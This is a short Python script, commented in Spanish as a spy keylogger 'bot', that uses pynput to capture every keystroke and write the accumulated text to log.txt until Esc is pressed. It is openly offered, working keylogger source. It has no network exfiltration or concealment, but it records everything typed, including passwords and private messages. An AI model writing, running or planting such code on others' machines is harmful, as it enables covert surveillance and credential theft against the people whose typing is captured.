#Bot Keylogger espía, registra teclas escritas

from pynput.keyboard import Key, Listener

keys = []
uniqueKeys = [' ', ' <- ', '/n']

def presionar_tecla(key):
    keys.append(key)
    convert_string(keys)

def convert_string(keys):
    with open('log.txt', 'w') as logfile:
        for key in keys:
            key = str(key).replace("'", "")
            logfile.write(switch_case(key))


def soltar_tecla(key):
    if key == Key.esc:
        return False

def switch_case(key):
    if key == 'Key.space':
        resultado = " "
    elif key == 'Key.backspace':
        resultado = " <- "
    elif key == 'Key.enter':
        resultado = "\n"
    else:
        resultado = key  # Esto es como el caso "default" en un switch

    return resultado

with Listener(on_press=presionar_tecla, on_release=soltar_tecla) as listener:
    listener.join()
